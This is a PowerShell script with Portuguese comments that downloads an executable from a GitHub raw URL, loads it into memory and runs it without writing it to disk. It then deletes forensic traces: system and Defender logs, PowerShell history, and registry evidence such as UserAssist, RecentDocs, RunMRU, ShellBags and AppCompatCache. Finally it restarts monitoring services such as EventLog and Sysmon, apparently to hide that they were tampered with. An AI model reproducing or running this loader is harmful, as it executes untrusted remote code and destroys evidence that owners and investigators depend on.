$link = "https://github.com/zold1337/toolsvip/raw/refs/heads/main/IME2.exe"
$webClient = New-Object System.Net.WebClient
$bytes = $webClient.DownloadData($link)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entry = $assembly.EntryPoint

# --- CORREÇÃO 1: Clear-RecycleBin com ErrorAction ---
Clear-RecycleBin -Force -Confirm:$false -ErrorAction SilentlyContinue

Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "UpdateExeVolatile" -Force -ErrorAction SilentlyContinue
Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-History -ErrorAction SilentlyContinue


# --- CORREÇÃO 2: Invoke com array correto ---
$invokeArgs = New-Object object[] 1 
$invokeArgs[0] = [string[]]@() 
$entry.Invoke($null, [object[]]@())

# --- LIMPEZA (sem erros) ---
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" -Name "EnablePrefetcher" -Value 3 -Type DWord -Force
fsutil behavior set disablelastaccess 0
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\CBS\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\CrashDumps\*.dmp"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\MoSetup\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Panther\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\inf\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\System32\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\SoftwareDistribution\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Microsoft.NET\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\SettingSync\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\ThumbCacheToDelete\*.tmp"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache\*.bin"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\INetCache\*"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\ProgramData\Microsoft\Windows\WER\ReportArchive\*"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\*"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\History\*"

# --- REGISTRO ---
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\UFH\SHC" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.dll\OpenWithList" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\WinRAR\ArcHistory" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\WinRAR\DialogEditHistory\ExtrPath" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\Bags" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\BagMRU" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Persisted" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKLM:\SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppLaunch" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count" -Recurse -Force -ErrorAction SilentlyContinue

# --- HISTÓRICO ---
Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-History -ErrorAction SilentlyContinue
Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-History -ErrorAction SilentlyContinue

$services = @(
    "SysMain",
    "Sysmon",
    "SysmonDrv",
    "PcaSvc",
    "DiagTrack",
    "bam",
    "dam",
    "VSS",
    "EventLog",
    "DPS"
)

$services = @(
    "SysMain",
    "Sysmon",
    "SysmonDrv",
    "PcaSvc",
    "DiagTrack",
    "bam",
    "dam",
    "VSS",
    "EventLog",
    "DPS"
)

foreach ($svc in $services) {
    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"

    # 1. Coloca como Automatic no registro
    if (Test-Path $regPath) {
        Set-ItemProperty -Path $regPath -Name "Start" -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue
        Write-Host "[REG] $svc → Automatic" -ForegroundColor Cyan
    }

    # 2. Tenta iniciar o serviço agora
    try {
        $service = Get-Service -Name $svc -ErrorAction Stop
        if ($service.Status -ne "Running") {
            Start-Service -Name $svc -ErrorAction Stop
            Write-Host "[START] $svc → Iniciado" -ForegroundColor Green
        }
        else {
            Write-Host "[OK] $svc já estava rodando" -ForegroundColor DarkGreen
        }
    }
    catch {
        Write-Host "[-] $svc não pôde ser iniciado (pode não existir neste sistema)" -ForegroundColor Yellow
    }
}
